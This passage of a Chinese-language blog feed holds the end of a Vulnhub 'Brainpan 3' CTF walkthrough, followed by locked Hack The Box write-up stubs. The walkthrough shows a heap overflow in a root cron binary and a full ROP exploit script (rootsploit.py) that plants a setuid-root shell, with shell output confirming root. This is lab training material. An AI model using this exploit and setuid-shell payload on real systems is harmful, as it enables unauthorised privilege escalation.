<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/home/puck$ ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">ls -lah /etc/cron.d/</span><br><span class="line">total 16K</span><br><span class="line">drwxr-xr-x  2 root root 4.0K May 20  2015 .</span><br><span class="line">drwxr-xr-x 90 root root 4.0K Feb  6 07:11 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  100 May 19  2015 msg_admin</span><br><span class="line">puck@brainpan3:/home/puck$ cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">cat /etc/cron.d/msg_admin</span><br><span class="line">* * * * * root <span class="built_in">cd</span> /opt/.messenger; <span class="keyword">for</span> i <span class="keyword">in</span> *.msg; <span class="keyword">do</span> /usr/<span class="built_in">local</span>/bin/msg_admin 1 <span class="variable">$i</span>; rm -f <span class="variable">$i</span>; <span class="keyword">done</span></span><br><span class="line">puck@brainpan3:/home/puck$ /usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/msg_admin</span><br><span class="line">Usage: /usr/<span class="built_in">local</span>/bin/msg_admin priority message.txt</span><br><span class="line">Message file format: requestername|message</span><br><span class="line">Eg: tony|Add a new user to repo</span><br><span class="line">Can have multiple messages <span class="keyword">in</span> a single file separated by newlines.</span><br><span class="line">Eg: tony|Please remove /tmp/foo</span><br><span class="line">    cate|Reset password request.</span><br></pre></td></tr></table></figure>

<p>cron job 从/opt/.messenger文件夹中获取所有.msg文件，并将它们传递给msg_admin可执行文件，然后删除该文件。将可执行文件复制到本地计算机进行分析。</p>
<p>struct_msg</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">struct struct_msg</span><br><span class="line">&#123;</span><br><span class="line">  int Priority;</span><br><span class="line">  char *Requestername;</span><br><span class="line">  char *Msg;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void *v3; // esp</span><br><span class="line">  int result; // eax</span><br><span class="line">  int v5; // ebx</span><br><span class="line">  int v6; // ebx</span><br><span class="line">  char *v7; // ebx</span><br><span class="line">  const char *v8; // [esp-18h] [ebp-98h]</span><br><span class="line">  int v9; // [esp-14h] [ebp-94h]</span><br><span class="line">  int v10; // [esp-Ch] [ebp-8Ch]</span><br><span class="line">  const char **v11; // [esp+0h] [ebp-80h]</span><br><span class="line">  int v12; // [esp+4h] [ebp-7Ch]</span><br><span class="line">  char *s; // [esp+Ch] [ebp-74h]</span><br><span class="line">  int v14; // [esp+10h] [ebp-70h]</span><br><span class="line">  int i; // [esp+14h] [ebp-6Ch]</span><br><span class="line">  int v16; // [esp+18h] [ebp-68h]</span><br><span class="line">  int v17; // [esp+1Ch] [ebp-64h]</span><br><span class="line">  int v18; // [esp+20h] [ebp-60h]</span><br><span class="line">  char *dest; // [esp+24h] [ebp-5Ch]</span><br><span class="line">  FILE *stream; // [esp+28h] [ebp-58h]</span><br><span class="line">  void *v21; // [esp+2Ch] [ebp-54h]</span><br><span class="line">  void *v22; // [esp+30h] [ebp-50h]</span><br><span class="line">  char *delim; // [esp+34h] [ebp-4Ch]</span><br><span class="line">  char *src; // [esp+38h] [ebp-48h]</span><br><span class="line">  int v25[10]; // [esp+3Ch] [ebp-44h]</span><br><span class="line">  unsigned int v26; // [esp+64h] [ebp-1Ch]</span><br><span class="line">  int *v27; // [esp+70h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  v27 = &amp;argc;</span><br><span class="line">  v12 = argc;</span><br><span class="line">  v11 = argv;</span><br><span class="line">  v26 = __readgsdword(0x14u);</span><br><span class="line">  v16 = 0;</span><br><span class="line">  v17 = 10;</span><br><span class="line">  v14 = 0;</span><br><span class="line">  i = 0;</span><br><span class="line">  v18 = 399;</span><br><span class="line">  v3 = alloca(400);</span><br><span class="line">  dest = (char *)&amp;v10;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = v11[1];</span><br><span class="line">    v16 = atol(v8);</span><br><span class="line">    stream = fopen(v11[2], <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    s = (char *)malloc(0x190u);</span><br><span class="line">    v21 = malloc(0x14u);</span><br><span class="line">    v22 = malloc(0x64u);</span><br><span class="line">    <span class="keyword">while</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 0 )</span><br><span class="line">      ++v14;</span><br><span class="line">    v9 = v14;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Recording %d entries\n&quot;</span>, v14);</span><br><span class="line">    rewind(stream);</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v25[i] = (int)malloc(0xCu);</span><br><span class="line">      *(_DWORD *)v25[i] = v16;</span><br><span class="line">      v5 = v25[i];</span><br><span class="line">      *(_DWORD *)(v5 + 4) = malloc(0xAu);</span><br><span class="line">      v6 = v25[i];</span><br><span class="line">      *(_DWORD *)(v6 + 8) = malloc(0xC8u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = 0; i &lt; v14; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      delim = <span class="string">&quot;|&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> ( getline((int)&amp;s, (int)&amp;LINEMAX_2, (int)stream) &gt; 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = s;</span><br><span class="line">        v7[strlen(s) - 1] = 0;</span><br><span class="line">        src = strtok(s, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 4), src);</span><br><span class="line">        src = strtok(0, delim);</span><br><span class="line">        strcpy(*(char **)(v25[i] + 8), src);</span><br><span class="line">        strncpy(dest, *(const char **)(v25[i] + 8), 0x64u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    notify_admin((int)v25, v14);</span><br><span class="line">    result = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    usage((int)*v11);</span><br><span class="line">    result = 1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是经典的内存损坏。对于.msg文件中的每条消息（行），它都会创建一个struct_msg结构并为其变量分配内存，然后将其添加到列表中。接下来，它循环遍历文件，并在“ |”定界符上分割每一行，并将每个部分复制到结构变量“Requestername”和“Msg”。这些变量的固定大小为10（请求者名称）和200（消息）。由于没有检查长度，因此可能破坏内存中的结构指针。以下代码创建一个包含2条消息的.msg文件，每个文件的变量都填充到其最大值，因此不会破坏任何内容。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line">payload =  10  * <span class="string">&#x27;\x41&#x27;</span> <span class="comment"># A</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span> <span class="comment"># B</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 10  * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># C</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span> <span class="comment"># D</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>当使用GDB分析内存时，可以看到如何映射所有内存</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x00000000    0x00000011</span><br><span class="line">0x804c478:    0x00000001    0x0804c488    0x0804c498    0x00000011</span><br><span class="line">0x804c488:    0x43434343    0x43434343    0x00004343    0x000000d1</span><br><span class="line">0x804c498:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4a8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4b8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4c8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4d8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4e8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c4f8:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c508:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c518:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c528:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c538:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c548:    0x44444444    0x44444444    0x44444444    0x44444444</span><br><span class="line">0x804c558:    0x44444444    0x44444444    0x00000000    0x00020aa1</span><br></pre></td></tr></table></figure>

<p>第一个struct_msg结构位于0x804c388，第二个位于0x804c478。现在，在第一个消息中使用较大的（216字节）“Msg”缓冲区时，将覆盖第二个struct_msg结构的“Requestername”指针，并在下一个strcpy调用中有效控制目标指针和源数据，从而导致Write-允许我们修补GOT条目的任何条件。这段代码将got.strtok地址修补为0x43434343，strtok是strcpy之后执行的下一个函数。我编写了一个ROP有效负载，它通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/ tmp / foo’调用eax（system），这是一个脚本由我们创建并在执行时将根拥有的SUID shell复制到tmp。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line"> </span><br><span class="line"><span class="comment"># message 1</span></span><br><span class="line"><span class="comment"># .got.plt:0804B05C off_804B05C     dd offset strtok        ; DATA XREF: _strtok</span></span><br><span class="line">payload = 10 * <span class="string">&#x27;\x41&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line">payload += 12 * <span class="string">&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment"># overwrite 2nd struct it&#x27;s requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes 0x43434343</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"><span class="comment"># message 2</span></span><br><span class="line">payload += 4 * <span class="string">&#x27;\x43&#x27;</span> <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;\x44&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;poc.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br></pre></td></tr></table></figure>

<p>一些GDB</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/150xw 0x804c388</span><br><span class="line">0x804c388:    0x00000001    0x0804c398    0x0804c3a8    0x00000011</span><br><span class="line">0x804c398:    0x41414141    0x41414141    0x00004141    0x000000d1</span><br><span class="line">0x804c3a8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3b8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3c8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3d8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3e8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c3f8:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c408:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c418:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c428:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c438:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c448:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c458:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c468:    0x42424242    0x42424242    0x42424242    0x42424242</span><br><span class="line">0x804c478:    0x42424242    0x0804b05c    0x0804c400    0x00000011</span><br><span class="line">0x804c488:    0x00000000    0x00000000    0x00000000    0x000000d1</span><br><span class="line">0x804c498:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4a8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4b8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4c8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4d8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4e8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c4f8:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c508:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c518:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c528:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c538:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c548:    0x00000000    0x00000000    0x00000000    0x00000000</span><br><span class="line">0x804c558:    0x00000000    0x00000000    0x00000000    0x00020aa1</span><br><span class="line">...</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x43434343</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xbffff2ac --&gt; 0x8048ce3 (:    mov    DWORD PTR [ebp-0x48],eax)</span><br><span class="line">0004| 0xbffff2b0 --&gt; 0x0 </span><br><span class="line">0008| 0xbffff2b4 --&gt; 0x8048f4d --&gt; 0x100007c </span><br><span class="line">0012| 0xbffff2b8 --&gt; 0x804c008 --&gt; 0xfbad2488 </span><br><span class="line">0016| 0xbffff2bc (<span class="string">&#x27;B&#x27;</span> repeats 100 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0020| 0xbffff2c0 (<span class="string">&#x27;B&#x27;</span> repeats 96 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0024| 0xbffff2c4 (<span class="string">&#x27;B&#x27;</span> repeats 92 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">0028| 0xbffff2c8 (<span class="string">&#x27;B&#x27;</span> repeats 88 <span class="built_in">times</span> <span class="string">&quot;\234, \357\377\267 \360\377\267&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x43434343 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>

<p>基于GDB的输出，可以看到，如果执行pop（4）小工具，将返回第一条（上一条）消息的“目标”数据，该消息由“strncpy（dest，aMessages [i]”存储在堆栈中]-&gt; Msg，100u）;’。</p>
<h4 id="root所有的一切"><a href="#root所有的一切" class="headerlink" title="root所有的一切"></a>root所有的一切</h4><p>编写了一个ROP payload，通过从3个阶段中添加0xE900来将取自atol的atol的地址加载到eax中，并将该值累加至系统，然后使用参数’/tmp/foo’调用eax（system），这是一个脚本由我创建并在执行时将root拥有的SUID shell复制到tmp。</p>
<p>rootsploit.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import os</span><br><span class="line"> </span><br><span class="line">def p(v):</span><br><span class="line">    <span class="built_in">return</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, v)</span><br><span class="line"> </span><br><span class="line">__strtok_got    = 0x0804B05C</span><br><span class="line">__atol_got      = 0x0804B04C</span><br><span class="line">__ppppr         = 0x08048DDC</span><br><span class="line">__foo_str       = 0x08048ED8</span><br><span class="line">__int16_e800h   = 0x080480C7</span><br><span class="line">__int16_0100h   = 0x08048093</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">rop  = p(0x08048790)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__atol_got - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_e800h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048E06)</span><br><span class="line">rop += p((__int16_0100h - 0x01270304) &amp; 0xFFFFFFFF)</span><br><span class="line">rop += p(0x08048FEB)</span><br><span class="line">rop += p(0x08048786)</span><br><span class="line">rop += p(__foo_str + 23)</span><br><span class="line"> </span><br><span class="line">payload = 10 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += rop.ljust(212, <span class="string">&#x27;A&#x27;</span>) <span class="comment"># padding till 212 eq next struct requestername pointer</span></span><br><span class="line">payload += p(0x0804B05C) <span class="comment"># strtok GOT, becomes __ppppr</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">payload += p(__ppppr) <span class="comment"># written to got.strtok</span></span><br><span class="line">payload += <span class="string">&#x27;|&#x27;</span></span><br><span class="line">payload += 200 * <span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"> </span><br><span class="line">open(<span class="string">&#x27;exploit.msg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(payload)</span><br><span class="line">foocode = <span class="string">&quot;cp /bin/sh /tmp/r00tsh3ll;chown root:root /tmp/r00tsh3ll;chmod 4755 /tmp/r00tsh3ll&quot;</span></span><br><span class="line">open(<span class="string">&#x27;/tmp/foo&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(foocode)</span><br><span class="line">os.system(<span class="string">&#x27;chmod +x /tmp/foo&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>从tmp文件夹执行漏洞利用脚本，并将创建的exploit.msg移至/opt/.messenger文件夹，然后稍等。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">puck@brainpan3:/tmp$ python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">python rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 20K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rw-r--r--  1 puck   dev     434 Feb  6 13:03 exploit.msg</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">mv exploit.msg /opt/.messenger/</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 16K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:03 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">ls -lah</span><br><span class="line">total 128K</span><br><span class="line">drwxrwxrwt  2 root   root   4.0K Feb  6 13:04 .</span><br><span class="line">drwxr-xr-x 21 root   root   4.0K Jun 17  2015 ..</span><br><span class="line">-rwxr-xr-x  1 puck   dev      82 Feb  6 13:03 foo</span><br><span class="line">-rwsr-xr-x  1 root   root   110K Feb  6 13:04 r00tsh3ll</span><br><span class="line">-rwxrwxrwx  1 anansi webdev 1.1K Feb  6 12:59 rootsploit.py</span><br><span class="line">puck@brainpan3:/tmp$ ./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line">./r00tsh3ll</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">id</span><br><span class="line">uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">ls</span><br><span class="line">brainpan.8.gz</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwx------  2 root root 4096 Jul 16  2015 .</span><br><span class="line">drwxr-xr-x 21 root root 4096 Jun 17  2015 ..</span><br><span class="line">-rw-------  1 root root    0 Jul 16  2015 .bash_history</span><br><span class="line">-rw-------  1 root root 3106 Feb 19  2014 .bashrc</span><br><span class="line">-rw-------  1 root root  140 May 31  2015 .profile</span><br><span class="line">-rw-------  1 root root  314 Jun 23  2015 brainpan.8.gz</span><br></pre></td></tr></table></figure>

<p>成功的取得了root权限</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub205.jpg"></p>
<p>将其中的brainpan.8.gz复制到/home/anansi文件夹，然后开启python的SimpleHTTPServer，将brainpan.8.gz下载之后解压，读取其中的内容，发现如下所示的文本，正好是flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># file brainpan.8 </span></span><br><span class="line">brainpan.8: troff or preprocessor input, ASCII text</span><br><span class="line">root@kali:~/vulnhub/brainpan3<span class="comment"># cat brainpan.8 </span></span><br><span class="line">.TH man 8 <span class="string">&quot;20 May 2015&quot;</span> <span class="string">&quot;3.0&quot;</span> <span class="string">&quot;brainpan 3&quot;</span></span><br><span class="line"></span><br><span class="line">.SH DESCRIPTION</span><br><span class="line">Congratulations, you win! Thanks <span class="keyword">for</span> playing!</span><br><span class="line"></span><br><span class="line">.SH FLAG</span><br><span class="line">.B</span><br><span class="line">flag&#123;tricksy-hobbitses-use-unix&#125;</span><br><span class="line"></span><br><span class="line">.SH BUGS</span><br><span class="line">You found them all. </span><br><span class="line"></span><br><span class="line">.SH AUTHOR</span><br><span class="line">superkojiman - </span><br><span class="line">.B</span><br><span class="line">http://blog.techorganic.com</span><br><span class="line"></span><br><span class="line">.SH TESTERS</span><br><span class="line">Special thanks go to barrebas and Swappage taking the time to <span class="built_in">test</span> Brainpan 3!</span><br><span class="line">.br</span><br><span class="line">barrebas - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/barrebas</span><br><span class="line">.br</span><br><span class="line">Swappage - </span><br><span class="line">.B</span><br><span class="line">https://twitter.com/Swappage</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub206.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>缓冲区溢出</li>
<li>堆栈溢出</li>
<li>字符串格式漏洞</li>
<li>反引号命令注入</li>
<li><blockquote>
<p>&amp;2管道命令输出</p>
</blockquote>
</li>
<li>python的pwntools模块使用编写poc</li>
<li>pwndbg调试shellcode</li>
<li>ROPGadget找到清晰的eax小工具</li>
<li>偏移量累积寻找</li>
</ul>
<p><font color="red">Game over</font></p>
<p>这次傻瓜式一键通关脚本就在方法一的尾部，enjoy it …</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[Unbalanced]</title>
    <url>/2020/08/17/Unbalanced/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article($6$6H...Yw1)</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="67a1faf8e46c717a189e94ec002b8f9a8f7f5b1b07eddd0cfc508c7ff6a88da2"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[worker]</title>
    <url>/2020/08/18/worker/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article(c699...4f)</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c5561b02ee1dbe6ec916d242a97fe5dd952572aaf34a3370691958e3d2cf1c2e"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HackTheBox walkthrough</category>
      </categories>
      <tags>
        <tag>HackTheBox靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Hack-The-Box-walkthrough[laser]</title>
    <url>/2020/08/19/laser/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">enter the root pass hash to unlock this article($6$b2...h3/)</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="11b3944b87750c242ae84b28763b66413942a4cac635823a7594a40cfe6ae651"></script>
</div>
